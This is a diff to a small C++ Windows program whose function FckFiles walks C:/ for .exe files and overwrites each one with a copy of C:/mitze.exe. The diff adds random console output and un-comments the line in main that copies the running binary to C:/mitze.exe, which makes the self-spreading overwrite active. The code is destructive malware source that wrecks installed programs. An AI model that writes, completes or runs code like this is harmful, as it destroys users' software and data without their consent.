@@ -28,6 +28,8 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
   {
     if (!recursively)
     {
+		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
     	string Chickfila = directory + std::string(FindFileData.cFileName);
 		CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
   		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
@@ -37,6 +39,8 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
     {
       if (!recursively)
       {
+		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
         string Chickfila = directory + std::string(FindFileData.cFileName);
         CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
   		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
@@ -61,6 +65,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 
 int main(int argc, char* argv[])
 {
-	//CopyFile("./a.exe","C:/mitze.exe",0);
+	CopyFile("./a.exe","C:/mitze.exe",0);
 	FckFiles("C:/", "*.exe");
 }
